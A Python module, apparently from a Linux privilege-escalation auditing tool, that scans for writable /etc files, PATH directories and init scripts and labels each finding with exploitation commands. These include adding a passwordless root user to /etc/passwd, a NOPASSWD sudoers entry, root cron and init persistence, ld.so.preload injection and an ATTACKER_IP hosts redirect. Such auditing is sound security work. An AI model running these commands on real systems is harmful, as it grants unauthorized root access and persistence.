"""
Writable Files Enumerator
=========================

Enumerate writable files in sensitive locations.

Writable configuration files, PATH directories, and system files
can lead to privilege escalation.
"""

import os
from pathlib import Path
from typing import List, Dict, Optional

from ..core.base import BaseEnumerator
from ..core.findings import FindingSeverity


class WritableFilesEnumerator(BaseEnumerator):
    """
    Enumerate writable files for privilege escalation.

    Checks:
    - Writable /etc files
    - Writable /etc/passwd and /etc/shadow
    - Writable PATH directories
    - Writable files in PATH
    - Writable init scripts
    """

    name = "Writable Files Enumerator"
    description = "Find writable files enabling privilege escalation"

    # Critical files - if writable, game over
    CRITICAL_FILES = {
        '/etc/passwd': (
            'Add passwordless root user:\n'
            '  echo "hacker::0:0::/root:/bin/bash" >> /etc/passwd\n'
            '  su hacker'
        ),
        '/etc/shadow': (
            'Replace root password hash:\n'
            '  Generate hash: openssl passwd -6 -salt xyz password123\n'
            '  Replace root line in /etc/shadow'
        ),
        '/etc/sudoers': (
            'Grant sudo access:\n'
            '  echo "youruser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
        ),
        '/etc/crontab': (
            'Add root cron job:\n'
            '  echo "* * * * * root /tmp/shell.sh" >> /etc/crontab'
        ),
        '/root/.ssh/authorized_keys': (
            'Add SSH key for root access:\n'
            '  echo "your_public_key" >> /root/.ssh/authorized_keys'
        )
    }

    def enumerate(self) -> None:
        """Run writable files enumeration"""
        self.print_header()

        self._check_critical_files()
        self._check_etc_files()
        self._check_path_directories()
        self._check_init_scripts()

    def _check_critical_files(self) -> None:
        """Check for writable critical system files"""
        self.log("Checking critical system files...")

        for file_path, exploitation in self.CRITICAL_FILES.items():
            if os.path.exists(file_path):
                if os.access(file_path, os.W_OK):
                    file_name = os.path.basename(file_path)

                    self.log(f"WRITABLE: {file_path}", "critical")

                    self.add_finding(
                        category=f"Writable {file_name}",
                        severity=FindingSeverity.CRITICAL,
                        finding=f"Critical system file is writable: {file_path}",
                        exploitation=exploitation,
                        impact="Critical - Direct root access",
                        target=file_path
                    )

    def _check_etc_files(self) -> None:
        """Check for writable files in /etc"""
        self.log("Checking for writable files in /etc...")

        output = self.run_command(
            "find /etc -type f -writable 2>/dev/null",
            timeout=30
        )

        if not output:
            self.log("No writable files in /etc (or search failed)")
            return

        writable_files = [
            line.strip()
            for line in output.split('\n')
            if line.strip() and line.strip() not in self.CRITICAL_FILES
        ]

        if writable_files:
            self.log(f"Found {len(writable_files)} writable files in /etc", "warning")

            for file_path in writable_files[:20]:  # Limit output
                self.log(f"  {file_path}")

                self.add_finding(
                    category="Writable /etc File",
                    severity=FindingSeverity.HIGH,
                    finding=f"Configuration file writable: {file_path}",
                    exploitation=self._get_etc_exploitation(file_path),
                    impact="High - Configuration manipulation",
                    target=file_path
                )

    def _get_etc_exploitation(self, path: str) -> str:
        """Get exploitation method for /etc file"""
        exploits = {
            'ld.so.conf': (
                'Add malicious library path:\n'
                '  echo "/tmp/malicious" >> /etc/ld.so.conf\n'
                '  # Create shared library in /tmp/malicious\n'
                '  ldconfig'
            ),
            'ld.so.preload': (
                'Preload malicious library:\n'
                '  echo "/tmp/malicious.so" >> /etc/ld.so.preload\n'
                '  # Library loaded into every process'
            ),
            'profile': (
                'Add commands executed on login:\n'
                '  echo "malicious_command" >> /etc/profile'
            ),
            'bash.bashrc': (
                'Add commands executed on bash start:\n'
                '  echo "malicious_command" >> /etc/bash.bashrc'
            ),
            'environment': (
                'Set malicious environment variables:\n'
                '  echo \'PATH="/tmp/malicious:$PATH"\' >> /etc/environment'
            ),
            'hosts': (
                'Redirect hostnames to malicious IPs:\n'
                '  echo "ATTACKER_IP targetsite.com" >> /etc/hosts'
            )
        }

        for key, exploit in exploits.items():
            if key in path:
                return exploit

        return "Analyze file for configuration injection opportunities"

    def _check_path_directories(self) -> None:
        """Check for writable directories in PATH"""
        self.log("Checking PATH directories...")

        path_value = os.environ.get('PATH', '')
        path_dirs = path_value.split(':')

        self.log(f"PATH: {path_value}")

        for directory in path_dirs:
            if not directory or not os.path.exists(directory):
                continue

            # Check if directory is writable
            if os.access(directory, os.W_OK):
                self.log(f"Writable PATH directory: {directory}", "warning")

                self.add_finding(
                    category="Writable PATH Directory",
                    severity=FindingSeverity.HIGH,
                    finding=f"PATH contains writable directory: {directory}",
                    exploitation=(
                        f"Hijack commands by placing malicious scripts:\n"
                        f"  # If 'service' is called:\n"
                        f"  echo '#!/bin/bash' > {directory}/service\n"
                        f"  echo 'id > /tmp/pwned' >> {directory}/service\n"
                        f"  chmod +x {directory}/service"
                    ),
                    impact="High - Command hijacking",
                    target=directory
                )

            # Check for writable files in PATH directories
            self._check_writable_in_path_dir(directory)

    def _check_writable_in_path_dir(self, directory: str) -> None:
        """Check for writable files within a PATH directory"""
        try:
            for item in os.listdir(directory):
                item_path = os.path.join(directory, item)

                if os.path.isfile(item_path) and os.access(item_path, os.W_OK):
                    self.log(f"Writable binary in PATH: {item_path}", "warning")

                    self.add_finding(
                        category="Writable PATH Binary",
                        severity=FindingSeverity.MEDIUM,
                        finding=f"Binary in PATH is writable: {item_path}",
                        exploitation=(
                            f"Replace with malicious version:\n"
                            f"  cp {item_path} {item_path}.bak\n"
                            f"  # Replace with malicious script"
                        ),
                        impact="Medium - Binary replacement",
                        target=item_path
                    )
        except PermissionError:
            pass

    def _check_init_scripts(self) -> None:
        """Check for writable init/startup scripts"""
        self.log("Checking init scripts...")

        init_dirs = [
            '/etc/init.d',
            '/etc/init',
            '/etc/rc.d',
            '/etc/rc.local'
        ]

        for init_path in init_dirs:
            if os.path.exists(init_path):
                if os.path.isdir(init_path):
                    self._check_writable_dir(init_path, "Init Script Directory")
                elif os.path.isfile(init_path) and os.access(init_path, os.W_OK):
                    self.log(f"Writable init script: {init_path}", "critical")

                    self.add_finding(
                        category="Writable Init Script",
                        severity=FindingSeverity.CRITICAL,
                        finding=f"Init script is writable: {init_path}",
                        exploitation=(
                            f"Add commands to {init_path}:\n"
                            f"  echo '/tmp/shell.sh &' >> {init_path}\n"
                            f"  # Executes as root on boot"
                        ),
                        impact="Critical - Root execution on boot",
                        target=init_path
                    )

    def _check_writable_dir(self, directory: str, category: str) -> None:
        """Check directory for writable files"""
        try:
            # Check if directory itself is writable
            if os.access(directory, os.W_OK):
                self.add_finding(
                    category=f"Writable {category}",
                    severity=FindingSeverity.HIGH,
                    finding=f"Directory is writable: {directory}",
                    exploitation="Add new scripts to directory",
                    impact="High - Script injection",
                    target=directory
                )

            # Check files in directory
            for item in os.listdir(directory):
                item_path = os.path.join(directory, item)

                if os.path.isfile(item_path) and os.access(item_path, os.W_OK):
                    self.log(f"Writable file: {item_path}", "warning")

                    self.add_finding(
                        category=f"Writable {category} Script",
                        severity=FindingSeverity.HIGH,
                        finding=f"Script is writable: {item_path}",
                        exploitation="Modify script to execute payload",
                        impact="High - Script modification",
                        target=item_path
                    )
        except PermissionError:
            pass